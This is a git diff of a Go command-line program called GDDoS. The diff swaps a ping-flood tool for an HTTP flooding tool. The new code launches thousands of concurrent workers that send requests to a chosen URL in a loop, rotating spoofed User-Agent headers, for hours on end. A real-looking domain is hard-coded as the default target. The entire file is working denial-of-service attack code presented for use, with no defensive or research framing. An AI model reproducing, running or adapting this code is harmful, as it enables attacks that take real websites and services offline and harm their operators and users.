@@ -1,72 +1,105 @@
 package main
 
 import (
+	"context"
+	"flag"
 	"fmt"
-	"bufio"
-	"os"
-	"github.com/sparrc/go-ping"
+	"io/ioutil"
+	"math/rand"
+	"net"
+	"net/http"
 	"strings"
+	"time"
+
+	"github.com/gookit/color"
 )
 
-const (
-	Prefix = "[GDDoS] "
-	WarningPrefix = "[WARNING] "
-	ErrorPrefix = "[ERROR] "
+var (
+	Method              string
+	TargetUrl           string
+	IntervalMillisecond int
+	ConcurrencyCount    int
+	DurationMinute      int
+
+	//TODO：Http Proxy
+	DDosHttpClient = &http.Client{
+		Transport: &http.Transport{
+			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
+				dialer := net.Dialer{
+					Timeout:   10 * time.Second,
+					KeepAlive: 60 * time.Second,
+				}
+				return dialer.Dial(network, addr)
+			},
+		},
+	}
+	UserAgents = []string{
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
+		"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
+		"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
+		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
+		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
+		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+	}
 )
 
 func main() {
-	fmt.Print("\x1b]0;" + Prefix + "Please type the ip that you want to DDoS..." + "\x07")
-	Log("This app is under a strict license that doesn't allow anyone to sell it or use it in a profit purpose!")
-	Log("Created by: 甜力怕 - https://github.com/xiaozhu2007")
-	Log("[Notice] To quit press: CTRL+C")
-	for {
-		Log("Please type the IP that you want to DDoS...")
-		scanner := bufio.NewScanner(os.Stdin)
-		scanner.Scan()
-		ip := scanner.Text()
-		if len(ip) < 7 || strings.Contains(ip, "legacyhcf") {
-			Error("The ip you've provided is invalid!")
-		} else {
-			running := true
-			stop := false
-			go func() {
-				Log("DDoSing the address " + ip + "...")
-				for running == true {
-					fmt.Print("\x1b]0;" + Prefix + "DDoSing the address ", ip, "..." + "\x07")
-					err := DDoS(ip)
-					if err != nil {
-						Error("Ops! Looks like something wrong has happened, Make you sure that the ip you provided is valid.")
-						os.Exit(1)
-					}
-				}
-				stop = true
-				Log("Successfully stopped the process!")
-			}()
-			Log("Press ENTER to stop the process!")
-			scanner.Scan()
-			Log("Stopping the process...")
-			running = false
-			for !stop {
-				fmt.Print("\x1b]0;" + Prefix + "Stopping the process..." + "\x07")
-			}
+	defaultTargetUrl := "https://xljtj.com" // 对不住了，您
+
+	flag.StringVar(&Method, "m", "GET", "DDos攻击目标URL请求方式(GET/POST/...)")
+	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "DDos攻击的目标URL")
+	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发用户数量")
+	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个用户执行DDos攻击的频率（毫秒）")
+	flag.IntVar(&DurationMinute, "dm", 2000, "DDos攻击持续时间（分钟）")
+	flag.Parse()
+
+	if TargetUrl == defaultTargetUrl {
+		color.Printf("TargetUrl is %s, 请尝试通过命令行传参数重新启动。Usage：<red>./goddos -h</>\n", TargetUrl)
+		return
+	}
+
+	go func() {
+		for i := 0; i < ConcurrencyCount; i++ {
+			go DoAttacking(i)
 		}
+	}()
+	time.Sleep(time.Duration(DurationMinute) * time.Minute)
+}
+
+func DoAttacking(grindex int) {
+	for i := 0; ; i++ {
+		if result, err := DoHttpRequest(); err != nil {
+			color.Printf("[GDDoS#%d/%d]<red>(%s)</>\n", grindex, i, err.Error())
+		} else {
+			responseStatus := fmt.Sprintf("<green>(%s)</>", *result)
+			if !strings.Contains(*result, "200 OK") {
+				responseStatus = fmt.Sprintf("<red>(%s)</>", *result)
+			}
+			color.Printf("[GDDoS#%d/%d]%s\n", grindex, i, responseStatus)
+		}
+		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
 	}
 }
 
-func DDoS(ip string) error {
-	pinger, err := ping.NewPinger(ip)
+func DoHttpRequest() (*string, error) {
+	request, err := http.NewRequest(Method, TargetUrl, nil)
 	if err != nil {
-		return err
+		return nil, err
 	}
-	pinger.Count = 65500
-	pinger.Run()
-	return nil
+	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
+
+	response, err := DDosHttpClient.Do(request)
+	if err != nil {
+		return nil, err
+	}
+	defer response.Body.Close()
+	// Ignore and read the responseBody
+	_, _ = ioutil.ReadAll(response.Body)
+
+	return &response.Status, err
 }
 
-func Log(i string) {
-	fmt.Println(Prefix + i)
-}
-
-func Error(i string) {
-	Log(ErrorPrefix + i)
-}
+// TODO: Add Log
